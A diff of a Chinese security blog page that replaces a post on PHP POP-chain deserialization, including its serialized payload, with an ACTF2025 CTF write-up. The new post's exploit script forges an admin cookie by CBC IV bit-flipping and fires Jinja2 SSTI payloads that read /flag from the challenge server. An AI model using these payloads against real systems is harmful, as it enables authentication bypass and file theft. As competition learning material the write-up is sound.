@@ -9,7 +9,7 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
   <title>
-    pop链构造 | Cl1ck-t0&#39;s blog
+    ACTF2025 | Cl1ck-t0&#39;s blog
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
@@ -17,18 +17,17 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包">
+    <meta name="description" content="ACTF2025解题记录 复健ing ACTF部分简单题做一下试试(实则难题碰都不敢碰QAQ)  一、not-so-web-1 ps:出题者说有手就行而我还搞了半天QAQ 题目描述：A (crypto) wolf in (web) sheep’s clothing 实则就是融合了crypto和web的内容，本题考点为SSTI漏洞和CBC翻转： 12345678910from Crypto.Cip">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pop链构造">
-<meta property="og:url" content="https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/index.html">
+<meta property="og:title" content="ACTF2025">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/07/14/ACTF2025/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包">
+<meta property="og:description" content="ACTF2025解题记录 复健ing ACTF部分简单题做一下试试(实则难题碰都不敢碰QAQ)  一、not-so-web-1 ps:出题者说有手就行而我还搞了半天QAQ 题目描述：A (crypto) wolf in (web) sheep’s clothing 实则就是融合了crypto和web的内容，本题考点为SSTI漏洞和CBC翻转： 12345678910from Crypto.Cip">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-02-19T08:41:25.000Z">
-<meta property="article:modified_time" content="2026-02-19T13:36:54.323Z">
+<meta property="article:published_time" content="2026-07-14T08:18:43.000Z">
+<meta property="article:modified_time" content="2026-07-14T09:02:51.022Z">
 <meta property="article:author" content="Cl1ck-t0">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="web漏洞">
+<meta property="article:tag" content="ACTF2025">
 <meta name="twitter:card" content="summary">
     <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
@@ -122,11 +121,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img  fetchpriority="high" src="/images/banner.webp" alt="pop链构造">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="ACTF2025">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">pop链构造</h1>
+            <h1 data-aos="slide-up">ACTF2025</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -157,7 +156,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text"> pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#egswpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-number">1.1.</span> <span class="toc-text"> eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#actf2025%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text"> ACTF2025解题记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-not-so-web-1"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、not-so-web-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-signin"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、signin</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -218,13 +217,13 @@
   </div>
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-pop链构造" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-ACTF2025" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-02-19T08:41:25.000Z" itemprop="datePublished">2026-02-19</time>
-    <time style="display: none;" id="post-update-time">2026-02-19</time>
+    <time datetime="2026-07-14T08:18:43.000Z" itemprop="datePublished">2026-07-14</time>
+    <time style="display: none;" id="post-update-time">2026-07-14</time>
   </span>
 </div>
 
@@ -233,95 +232,59 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="pop链构造"><a class="markdownIt-Anchor" href="#pop链构造"></a> pop链构造</h1>
-<p>在PHP反序列化漏洞利用中，<strong>POP链（Property Oriented Programming Chain）</strong> 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：<strong>找到入口 → 确定尾巴 → 构建中间桥梁</strong>。</p>
-<p><strong>1. 明确入口与尾巴</strong></p>
+        <h1 id="actf2025解题记录"><a class="markdownIt-Anchor" href="#actf2025解题记录"></a> ACTF2025解题记录</h1>
+<p>复健ing</p>
+<p>ACTF部分简单题做一下试试(实则难题碰都不敢碰QAQ)</p>
+<h2 id="一-not-so-web-1"><a class="markdownIt-Anchor" href="#一-not-so-web-1"></a> 一、not-so-web-1</h2>
+<p>ps:出题者说有手就行而我还搞了半天QAQ</p>
+<p>题目描述：A (crypto) wolf in (web) sheep’s clothing</p>
+<p>实则就是融合了crypto和web的内容，本题考点为SSTI漏洞和CBC翻转：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line"></span><br><span class="line">def generate_cookie(user: APPUser) -&gt; str:</span><br><span class="line">    # ...</span><br><span class="line">    iv = os.urandom(16)</span><br><span class="line">    padded = pad(cookie_json_bytes, 16)</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CBC, iv)  # ← 明确指定CBC模式</span><br><span class="line">    encrypted = cipher.encrypt(padded)</span><br><span class="line">    return base64.b64encode(iv + encrypted).decode()</span><br></pre></td></tr></table></figure>
+<p>我们通过<s>AI分析</s>，发现有下面几个特点：</p>
+<p>Cookie结构为 <code>base64(iv + ciphertext)</code></p>
+<p>IV在Cookie中可控</p>
+<p>Admin用户有SSTI漏洞</p>
+<p>所以我们的目标就明确了：</p>
 <ul>
-<li><strong>入口</strong>：常见为 <em>__wakeup()</em>、<em>__destruct()</em> 等在反序列化或对象销毁时自动调用的方法。</li>
-<li><strong>尾巴</strong>：包含危险函数的代码位置，如 <em>eval()</em>、<em>system()</em>、<em>file_put_contents()</em>、<em>include()</em> 等。</li>
-<li>先锁定尾巴，再反向寻找能触发它的调用链。</li>
+<li><strong>目标：</strong> 通过CBC字节翻转将用户名改为admin</li>
+<li><strong>手段：</strong> 修改IV</li>
+<li><strong>前提：</strong> 用户名长度必须和目标相同</li>
 </ul>
-<p><strong>2. 利用魔术方法串联</strong> 常用魔术方法及触发条件：</p>
-<ul>
-<li>
-<p><em>__get()</em>：访问不可访问属性时触发。</p>
-</li>
-<li>
-<p><em>__set()</em>：给不可访问属性赋值时触发。</p>
-</li>
-<li>
-<p><em>__call()</em>：调用不存在方法时触发。</p>
-</li>
-<li>
-<p><em>__tostring()</em>：对象被当作字符串使用时触发。</p>
-</li>
-<li>
-<p><em>__invoke()</em>：对象被当作函数调用时触发。</p>
-<p>总之就是</p>
-<p>1.寻找可利用的魔术方法作为起点，也就是说链头特征是能够被输入内容的并且能被用户所控制的；</p>
-<ol start="2">
-<li>构建方法调用链，连接起点和终点；</li>
-<li>找到危险函数或操作作为终点，也就是说链尾特征是可以读取文件或者能够执行命令的；</li>
-<li>此时我们找到了链尾，正式开始构造pop链，从链尾反推到链头。</li>
-</ol>
-</li>
-</ul>
-<h3 id="egswpuctf-2021-新生赛pop"><a class="markdownIt-Anchor" href="#egswpuctf-2021-新生赛pop"></a> eg.[SWPUCTF 2021 新生赛]pop</h3>
-<p>代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>我们来进行简单分析：</p>
-<p>1.对于w44m类;</p>
-<p>如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,</p>
-<p>若是private，则会在变量名前加上<code>\x00类名\x00</code>,输出时一般需要url编码;</p>
-<p>最终目标是调用Getflag()；</p>
-<p>2.对于w22m类；</p>
-<p>当类销毁时会输出<code>$this-&gt;w00m</code>；</p>
-<p>3.对于w33m类；</p>
-<p>当w33m类的对象被当做字符串使用时，触发__toString()方法；</p>
-<p>接着，我们尝试构造一下pop链，</p>
-<ul>
-<li>在w44m类中的Getflag作为尾部</li>
-<li>w33m类中有<code>$this-&gt;w00m-&gt;{$this-&gt;w22m}();</code>，因此我们需要给w00m一个w44m类，给w22m一个Getflag字符串</li>
-<li>而如何调用w33m类中的__toString()方法呢，我们看到w22m类中有<code>echo $this-&gt;w00m;</code>，需要给w00m一个w33m类即可</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w22m::__destruct()-&gt;w33m::__toString()-&gt;w44m::Getflag()</span><br></pre></td></tr></table></figure>
-<p>接着，我们再尝试构造payload：</p>
-<p>1、首先复制源码到编辑器中<br />
-将不需要的部分注释掉(和赋值无关的都注释掉)</p>
-<p>以下是删除注释后的剩余部分：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>2、添加pop链和序列化代码<br />
-根据前面我们的分析，从pop链的链尾开始赋值<br />
-私有和保护属性，采用内部赋值；</p>
-<p>对象赋值采用外部赋值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a=new w44m();// 创建w44m对象</span><br><span class="line">// 这里$a的属性还没有赋值，保持默认值</span><br><span class="line"></span><br><span class="line">$b=new w33m();</span><br><span class="line">$b-&gt;w00m=$a;//外部赋值：给public属性$w00m赋值</span><br><span class="line">$b-&gt;w22m=Getflag;//外部赋值：给public属性$w22m赋值</span><br><span class="line"></span><br><span class="line">$t=new w22m();</span><br><span class="line">$t-&gt;w00m=$b;</span><br><span class="line">echo serialize($t);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo urlencode(serialize($t));</span><br></pre></td></tr></table></figure>
-<p>构造得：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;\00w44m\00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;\00*\00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>URL编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-<p>然后得到flag。</p>
+<p>我们构造用户名为5个字符，随便怎么样都行，然后写翻转代码：</p>
+<p>ps:AI写的真是又臭又长（）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def cbc_bit_flipping_happy_to_admin(cookie):</span><br><span class="line"></span><br><span class="line">    cookie_bytes = base64.b64decode(cookie)</span><br><span class="line"></span><br><span class="line">    iv = bytearray(cookie_bytes[:16])</span><br><span class="line">    ciphertext = cookie_bytes[16:]</span><br><span class="line"></span><br><span class="line">    print(f&quot;原始IV: &#123;iv.hex()&#125;&quot;)</span><br><span class="line">    print(f&quot;密文长度: &#123;len(ciphertext)&#125; 字节&quot;)</span><br><span class="line"></span><br><span class="line">    original_block = &#x27;&#123;&quot;name&quot;: &quot;happy&quot;, &quot;&#x27;</span><br><span class="line">    target_block = &#x27;&#123;&quot;name&quot;: &quot;admin&quot;, &quot;&#x27;</span><br><span class="line"></span><br><span class="line">    print(f&quot;\n原始block: &#123;original_block&#125;&quot;)</span><br><span class="line">    print(f&quot;目标block: &#123;target_block&#125;&quot;)</span><br><span class="line">    print(f&quot;长度: &#123;len(original_block)&#125; 字节&quot;)</span><br><span class="line"></span><br><span class="line">    new_iv = bytearray(iv)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n=== 计算字节翻转 ===&quot;)</span><br><span class="line">    for i in range(16):</span><br><span class="line">        if original_block[i] != target_block[i]:</span><br><span class="line">            orig_char = ord(original_block[i])</span><br><span class="line">            target_char = ord(target_block[i])</span><br><span class="line">            new_iv[i] = iv[i] ^ orig_char ^ target_char</span><br><span class="line">            print(</span><br><span class="line">                f&quot;位置 &#123;i:2d&#125;: &#x27;&#123;original_block[i]&#125;&#x27; (0x&#123;orig_char:02x&#125;) -&gt; &#x27;&#123;target_block[i]&#125;&#x27; (0x&#123;target_char:02x&#125;)&quot;)</span><br><span class="line">            print(f&quot;         IV[&#123;i:2d&#125;] = 0x&#123;iv[i]:02x&#125; -&gt; 0x&#123;new_iv[i]:02x&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 构造新的cookie</span><br><span class="line">    new_cookie_bytes = bytes(new_iv) + ciphertext</span><br><span class="line">    new_cookie = base64.b64encode(new_cookie_bytes).decode()</span><br><span class="line"></span><br><span class="line">    print(f&quot;\n新的IV: &#123;new_iv.hex()&#125;&quot;)</span><br><span class="line">    print(f&quot;新的cookie: &#123;new_cookie&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    return new_cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def verify_and_exploit(base_url, cookie):</span><br><span class="line">    &quot;&quot;&quot;验证cookie并尝试SSTI&quot;&quot;&quot;</span><br><span class="line">    print(&quot;\n=== 验证新的cookie ===&quot;)</span><br><span class="line">    cookies = &#123;&#x27;jwbcookie&#x27;: cookie&#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        resp = requests.get(base_url, cookies=cookies, allow_redirects=False, timeout=5)</span><br><span class="line">        print(f&quot;状态码: &#123;resp.status_code&#125;&quot;)</span><br><span class="line">        print(f&quot;重定向位置: &#123;resp.headers.get(&#x27;Location&#x27;, &#x27;无&#x27;)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        if resp.status_code == 200:</span><br><span class="line">            print(&quot;[+] 成功登录！&quot;)</span><br><span class="line">            print(f&quot;页面内容预览: &#123;resp.text[:200]&#125;...&quot;)</span><br><span class="line"></span><br><span class="line">            print(&quot;\n=== 尝试SSTI获取flag ===&quot;)</span><br><span class="line">            payloads = [</span><br><span class="line">                &quot;&#123;&#123; config &#125;&#125;&quot;,</span><br><span class="line">                &quot;&#123;&#123; self.__class__.__mro__[1].__subclasses__() &#125;&#125;&quot;,</span><br><span class="line">                &quot;&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__() &#125;&#125;&quot;,</span><br><span class="line">                &quot;&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read() &#125;&#125;&quot;,</span><br><span class="line">                &quot;&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;flag&#x27;).read() &#125;&#125;&quot;,</span><br><span class="line">                &quot;&#123;&#123; request.application.__self__._get_data_for_json.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read() &#125;&#125;&quot;,</span><br><span class="line"></span><br><span class="line">                &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/flag&#x27;).read()&#125;&#125;&quot;,</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            for payload in payloads:</span><br><span class="line">                encoded = requests.utils.quote(payload)</span><br><span class="line">                url = f&quot;&#123;base_url&#125;?payload=&#123;encoded&#125;&quot;</span><br><span class="line">                print(f&quot;\n测试: &#123;payload[:40]&#125;...&quot;)</span><br><span class="line"></span><br><span class="line">                try:</span><br><span class="line">                    resp2 = requests.get(url, cookies=cookies, timeout=5)</span><br><span class="line">                    if resp2.status_code == 200:</span><br><span class="line">                        if &#x27;flag&#x27; in resp2.text.lower() or &#x27;&#123;&#x27; in resp2.text or &#x27;CTF&#x27; in resp2.text:</span><br><span class="line">                            print(&quot;\n[!] 发现flag!&quot;)</span><br><span class="line">                            # 提取flag</span><br><span class="line">                            lines = resp2.text.split(&#x27;\n&#x27;)</span><br><span class="line">                            for line in lines:</span><br><span class="line">                                if &#x27;flag&#x27; in line.lower() or &#x27;&#123;&#x27; in line or &#x27;CTF&#x27; in line:</span><br><span class="line">                                    print(f&quot;Flag: &#123;line.strip()&#125;&quot;)</span><br><span class="line">                            return</span><br><span class="line">                        elif &#x27;config&#x27; in resp2.text:</span><br><span class="line">                            print(&quot;[+] 配置信息泄露成功&quot;)</span><br><span class="line">                            print(resp2.text[:300])</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    print(f&quot;错误: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] 登录失败，cookie无效&quot;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;请求错误: &#123;e&#125;&quot;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    base_url = &quot;http://oj-10-30-15-1-57207.adworld.xctf.org.cn/home&quot;</span><br><span class="line"></span><br><span class="line">    cookie = &quot;lbMPnO/pCKxiQCDlfqhWnojTAeRP24UGEKBhzBxwYouWi1aTTOJe11vwOY1wRTeZA+sZ79dvS9uGLb5njipH93C2etLyrsa8fVwWBdb+woDP3X9u20oiUvThWOy9CVpa&quot;</span><br><span class="line"></span><br><span class="line">    print(&quot;=== CBC字节翻转攻击: happy -&gt; admin ===&quot;)</span><br><span class="line">    print(f&quot;原始cookie: &#123;cookie[:50]&#125;...&quot;)</span><br><span class="line"></span><br><span class="line">    admin_cookie = cbc_bit_flipping_happy_to_admin(cookie)</span><br><span class="line"></span><br><span class="line">    verify_and_exploit(base_url, admin_cookie)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n=== 尝试其他可能性 ===&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n尝试只修改用户名部分...&quot;)</span><br><span class="line">    cookie_bytes = base64.b64decode(cookie)</span><br><span class="line">    iv = bytearray(cookie_bytes[:16])</span><br><span class="line">    ciphertext = cookie_bytes[16:]</span><br><span class="line"></span><br><span class="line">    original = &quot;happy&quot;</span><br><span class="line">    target = &quot;admin&quot;</span><br><span class="line"></span><br><span class="line">    offset = 9</span><br><span class="line"></span><br><span class="line">    new_iv = bytearray(iv)</span><br><span class="line">    for i, (orig, targ) in enumerate(zip(original, target)):</span><br><span class="line">        pos = offset + i</span><br><span class="line">        new_iv[pos] = iv[pos] ^ ord(orig) ^ ord(targ)</span><br><span class="line">        print(f&quot;位置 &#123;pos&#125;: &#x27;&#123;orig&#125;&#x27; -&gt; &#x27;&#123;targ&#125;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    new_cookie = base64.b64encode(bytes(new_iv) + ciphertext).decode()</span><br><span class="line">    print(f&quot;\n新cookie: &#123;new_cookie&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    verify_and_exploit(base_url, new_cookie)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
